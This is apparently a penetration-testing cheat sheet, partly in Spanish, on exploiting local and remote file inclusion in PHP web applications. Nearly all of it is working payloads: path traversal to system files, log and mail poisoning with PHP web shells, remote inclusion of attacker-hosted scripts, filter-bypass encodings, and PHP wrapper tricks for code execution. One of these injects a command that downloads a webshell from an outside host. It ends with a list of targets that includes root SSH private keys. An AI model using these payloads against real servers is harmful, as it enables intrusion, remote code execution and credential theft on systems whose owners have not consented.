---
title: Local and Remote file inclusion
category: web
order: 1
---



# 1 Local File inclusion
---
* linux:  
```
      https://insecure-website.com/loadImage?filename=../../../etc/passwd
```
* windows
  ```
  http://target.com/?page=c:\windows\system32\drivers\etc\hosts
  http://webserver:ip/index.html?../../../../../boot.ini

  ```


### Log Poisoning  

* web log poisoning
```
nc 10.10.10.14 80
<?php echo '<pre>' . shell_exec($_GET['cmd'])  . '</pre>'; ?>
```
* **linux**
```
curl http://10.10.0.1/addguestbook.php?name=Test&comment=Which+lang%3F&cmd=ipconfig&LANG=../../../../../../../xampp/apache/logs/access.log%00&Submit=Submit
```

* **windows**
```
curl http://10.10.10.14/menu.php?file=c:\xamp\apache\logs\access.log&cmd=ls
```

### SSH log posioning  
http://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/  

### Mail log  
LFI /var/mail/<user>  

```
telnet <IP> 25  
EHLO <random character>  

VRFY <user>@localhost  

mail from:attacker@attack.com  
rcpt to: <user>@localhost  
data  

Subject: title  

<?php echo system($_REQUEST[cmd]); ?>  

<end with .>  

```


# 2 Remote File Inclusion  
---

requires allow_url_fopen=On and allow_url_include=On  
```

$incfile = $_REQUEST["file"];  
include($incfile.".php");  

```

* **original**
```
http://10.10.0.1/addguestbook.php?name=Test&comment=Which+lang%3F&LANG=FR&Submit=Submit
   ```
* **modificado**
```
http://10.10.0.1/addguestbook.php?name=Test&comment=Which+lang%3F&LANG=http://10.10.10.10./evil.php&Submit=Submit
```

seguro nos tira un problema  tratando de ejecutar evil.txt.php, asi que podemos usar un nullbyte para que no appenda el .php
```
10.10.0.1/addguestbook.php?name=Test&comment=Which+lang%3F&LANG=http://10.10.10.10./evil.php%00&Submit=Submit
```

## web shell rfi
```
cat shell.php
<?=`$_GET[0]`?>
```
```
http://10.10.10.151/blog/?lang=//10.10.14.23/Public/shell.php&0=dir
```

# 3 Common obstacules
---
* just the path  
```
      filename=/etc/passwd
```
* stripped non recursive  
```
filename=....//....//....//etc/passwd
```

* encoding  
```
 filename=..%252f..%252f..%252fetc/passwd
```
* validation of start path
```
 filename=/var/www/images/../../../etc/passwd
```
* add nullbyte
```
 filename=..%252f..%252f..%252fetc/passwd%00
```

# 4 common LFI to RCE
---

## 1. Using file upload forms/functions
upload a shell,  then
```
http://example.com/index.php?page=path/to/uploaded/file.php
```

## 2. Using the PHP wrapper expect://command
if the app use an include:
```
<?php  
include $_GET['page'];  
?>  
```
```
http://target.com/index.php?page=expect://whoami  
```
## 3. Using php wrapper file://
```
http://localhost/include.php?page=file:///path/to/file.ext
```
## 4. Using the PHP wrapper php://filter
```
http://localhost/include.php?page=php://filter/convert.base64-encode/resource=secret.inc
http://localhost/include.php?page=php://filter/read=convert.base64-encode/resource=secret.inc
http://localhost/include.php?page=php://filter/resource=/etc/passwd
```
## 5. Using PHP input:// stream
POST
```
/fi/?page=php://input&cmd=ls
```
## 6. Using data://text/plain;base64,command
```
data://text/plain;base64,[command encoded in base64]
or
data://text/plain,<?php shell_exec($_GET['cmd']);?>  
```
ex:
```
http://example.com/Keeper.php?page=data://text/plain;base64,JTNDJTNGc3lzdGVtJTI4JTI3aWQlMjclMjklM0IlM0YlM0U=  
http://example.com/Keeper.php?page=data://text/plain,<?system('id');?>  
```
## 7. Using /proc/self/environ
Another popular technique is to manipulate the Process Environ file. In a nutshell, when a process is created and has an open file handler then a file descriptor will point to that requested file.

Our main target is to inject the /proc/self/environ file from the HTTP Header: User-Agent. This file hosts the initial environment of the Apache process. Thus, the environmental variable User-Agent is likely to appear there.
```
curl http://secureapplication.example/index.php?view=../../../proc/self/environ
```
response:
```
HTTP_USER_AGENT="curl/" </body>
```
so we can inject shit like a webshell
```
curl -H "User-Agent: <?php system('wget http://10.10.14.6/webshell.php -O webshell.php')" http://target.com

curl http://target.com/webshell.php&cmd=ls

```

## 8. Using /proc/self/fd
brute force the fd until you see "referer"
/proc/self/fd/{number}
then
```
curl -H "Referer: <?php phpinfo(); ?>" http://target.com
```

## 9. Using zip
Upload a ZIP file containing a PHP shell compressed and access:
```
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
## 10. Using log files with controllable input like:
      . /var/log/apache/access.log
      . /var/log/apache/error.log
      . /var/log/vsftpd.log
      . /var/log/sshd.log
      . /var/log/mail


# 5 Common files location
---

https://wiki.apache.org/httpd/DistrosDefaultLayout  
**Common log file location**  
**Ubuntu, Debian**  
```
/var/log/apache2/error.log  
/var/log/apache2/access.log  
```
**Red Hat, CentOS, Fedora, OEL, RHEL**  
```
/var/log/httpd/error_log  
/var/log/httpd/access_log  
```
**FreeBSD**  
```
/var/log/httpd-error.log  
/var/log/httpd-access.log  
```
**Common Config file location**  

check any restriction or hidden path on accessing the server  

**Ubuntu**  
```
/etc/apache2/apache2.conf  
/etc/apache2/httpd.conf  
/etc/apache2/apache2.conf  
/etc/httpd/httpd.conf  
/etc/httpd/conf/httpd.conf  
```
**FreeBSD**  
```
/usr/local/etc/apache2/httpd.conf  

Hidden site?  
/etc/apache2/sites-enabled/000-default.conf  
```

**root/user ssh keys? .bash_history?**
```
/root/.ssh/id_rsa
/root/.ssh/id_rsa.keystore
/root/.ssh/id_rsa.pub
/root/.ssh/authorized_keys
/root/.ssh/known_hosts
```
# Resources
https://www.php.net/manual/en/wrappers.file.php
